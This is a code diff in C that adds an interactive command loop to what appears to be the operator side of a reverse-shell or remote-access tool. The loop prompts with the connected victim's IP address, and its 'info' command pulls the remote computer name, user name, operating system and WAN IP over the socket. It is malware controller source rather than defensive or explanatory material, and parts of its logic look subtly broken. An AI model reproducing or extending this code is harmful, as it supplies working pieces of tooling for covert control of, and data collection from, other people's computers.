@@ -27,5 +27,49 @@ int Shell(){
     char *p=getenv("USER");
     sleep(1);
 
-    printf("   [>>] Shell Session Opened!\n");  
+    printf("   [>>] Shell Session Opened!\n");
+    //Adding Commands
+
+    while(1){
+        printf(" %s@%s:~$ ", p, inet_ntoa(cli_addr.sin_addr));
+        bzero(command, 1024);
+        fgets(command, 1024, stdin);
+
+        if(strncmp(command, help, strlen(help))==0){
+            printf(HELP);
+        }
+
+        else if(strncmp(command, close, strlen(close))==0){
+            n=write(newsock_fd, close, strlen(close));
+            printf(" [>>] Closing. ");
+            exit(1);
+        }
+
+        else if(strncmp(command, info, strlen(info))==0){
+            bzero(command, 1024);
+            printf(" [>>] Waiting for info.\n");
+
+            if(n<0)
+                    ErrorMessage(" [!!] Error Writing To Soclet!\n");
+            
+            n=read(newsock_fd, COMPUTER, 1024);
+            n=read(newsock_fd, USER, 1024);
+            n=read(newsock_fd, OS, 1024);
+            n=read(newsock_fd, WANIP, 1024);
+
+            printf(" Computer Name -- %s\n", COMPUTER);
+            printf(" User Name     -- %s\n", USER);
+            printf(" Operating Sys -- %s\n", OS);
+            printf(" WAN IP        -- %s\n", WANIP);            
+        }
+
+        else if(strncmp(command, clear, strlen(clear))==0){
+            system("clear");
+        }
+
+        else {
+            printf(" [!!] Invalid Command!\n");
+        }
+    }
 }
+
